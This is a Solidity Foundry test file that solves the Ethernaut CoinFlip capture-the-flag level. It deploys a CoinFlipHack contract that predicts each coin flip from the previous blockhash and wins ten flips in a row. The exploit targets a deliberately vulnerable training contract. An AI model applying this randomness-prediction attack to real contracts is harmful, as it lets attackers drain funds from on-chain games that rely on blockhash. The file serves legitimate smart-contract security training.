// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../04-CoinFlip/CoinFlipFactory.sol";
import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/utils/math/SafeMath.sol";

contract CoinFlipAttack is Test {
    function testCoinFlip() external {
        console.log("setup");
        bool sukses;
        vm.createSelectFork(vm.envString("sepolia"));
        Ethernaut ethernaut = new Ethernaut();
        CoinFlipFactory factory = new CoinFlipFactory();
        ethernaut.registerLevel(factory);
        address kacrut = makeAddr("kacrut");
        vm.deal(kacrut, 100 ether);
        vm.startPrank(kacrut, kacrut);
        address addr = ethernaut.createLevelInstance(factory);
        CoinFlip coinflip = CoinFlip(addr);
        emit log_named_address("coinflip", address(coinflip));
        emit log("PoC");
        emit log("1. deploy CoinFlipHack");
        CoinFlipHack hack = new CoinFlipHack(address(coinflip));
        emit log("2. attack");
        for (uint256 i = 0; i < 10; i++) {
            vm.roll(69 + i);
            hack.attack();
            emit log_named_uint("menang", coinflip.consecutiveWins());
        }
        if (coinflip.consecutiveWins() == 10) {
            sukses = ethernaut.submitLevelInstance(payable(address(coinflip)));
            assertTrue(sukses);
        } else {
            assertTrue(sukses);
        }
    }
}

contract CoinFlipHack {
    using SafeMath for uint256;

    CoinFlip coinflip;

    constructor(address coin) {
        coinflip = CoinFlip(coin);
    }

    function attack() external {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        coinflip.flip(side);
    }
}
